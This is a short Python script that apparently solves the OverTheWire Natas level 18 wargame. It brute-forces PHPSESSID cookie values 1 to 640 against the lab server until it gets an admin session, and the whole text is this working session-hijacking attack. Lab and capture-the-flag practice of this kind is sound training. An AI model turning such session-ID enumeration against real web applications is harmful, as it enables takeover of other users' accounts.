import requests, time
from pwn import log

url = "http://natas18.natas.labs.overthewire.org"
auth = ('natas18', '<ContraseñaNatas18>')

p1 = log.progress("Fuerza bruta")
p1.status("Iniciando ataque")
time.sleep(2)


for i in range(1, 641):  
    cookies = {'PHPSESSID': str(i)}
    r = requests.get(url, auth=auth, cookies=cookies)
    p1.status(cookies)
    if "You are an admin" in r.text:
        print(f"[+] Admin Encontrado con ID = {i}")
        print(r.text)
        break